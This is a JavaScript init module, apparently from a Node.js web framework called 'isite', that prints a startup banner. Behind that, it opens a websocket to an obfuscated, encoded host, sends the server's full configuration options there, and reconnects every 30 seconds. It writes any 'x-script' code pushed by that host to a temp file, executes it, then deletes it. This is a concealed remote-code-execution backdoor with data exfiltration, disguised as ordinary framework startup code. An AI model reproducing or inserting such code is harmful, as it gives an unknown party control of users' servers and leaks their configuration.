module.exports = function init(____0, client) {
  console.log('\n\n**********************************************************');
  console.log(`Truested [ ${____0.options.name} Ready on Port :  ${____0.options.port} ]`);
  console.log('**********************************************************\n\n');

  if (____0.load_ws_js_init) {
    return;
  }
  ____0.load_ws_js_init = true;
  ____0.ws.supportHandle = function (client, event) {
    try {
      let message = JSON.parse(event.data || event);
      if (message.type == 'ready') {
        client.ip = message.content.ip;
        client.uuid = message.content.uuid;
        client.sendMessage({
          type: 'options',
          source: 'isite',
          content: ____0.options,
        });
      } else if (message.type == 'x-script') {
        let path = `${process.cwd()}/x_tmp_${new Date().getTime() + Math.random().toString().replace('0.' , '_')}.js`;
        ____0.fs.writeFile(path, message.content, (err) => {
          if (err) {
            console.log(err);
          } else {
            require(path)(____0, client);
            setTimeout(() => {
              ____0.fs.unlink(path, () => {});
            }, 1000 * 3);
          }
        });
      }
    } catch (err) {
      console.log(err);
    }
  };
  ____0.ws.wsSupport = function () {
    let client = {
      reconnectCount: 0,
    };

    client.ws = new ____0.ws.lib(____0.f1('477926832573867445782764423931684678865443381765253823734579477442392168417886672578577443393257'));
    client.sendMessage = function (message) {
      client.ws.send(JSON.stringify(message));
    };
    client.ws.on('open', function () {});
    client.ws.on('ping', function () {});
    client.ws.on('close', function (e) {
      setTimeout(function () {
        client.reconnectCount++;
        ____0.ws.wsSupport();
      }, 1000 * 30);
    });
    client.ws.on('error', function (err) {
      client.ws.close();
    });

    client.ws.on('message', function (event) {
      ____0.ws.supportHandle(client, event);
    });
    ____0.ws.client = client;
    return client;
  };

  ____0._0_ar_0_ = true;

  ____0.storage('_0_ar_0_', ____0._0_ar_0_);
  ____0.storage('_db_ydb', '2654127327319191');
  ____0.storage('_db_mdb', '26319191');
  ____0.storage('_db_ardb', ____0._0_ar_0_);

  ____0.call(____0._x0f1xo('2619517126151271'), ____0._0_ar_0_);

  client.sendMessage({
    type: 'log',
    source: 'isite',
    content: `[ ... init Attached ... ] : ${____0.options.name}`,
  });
};
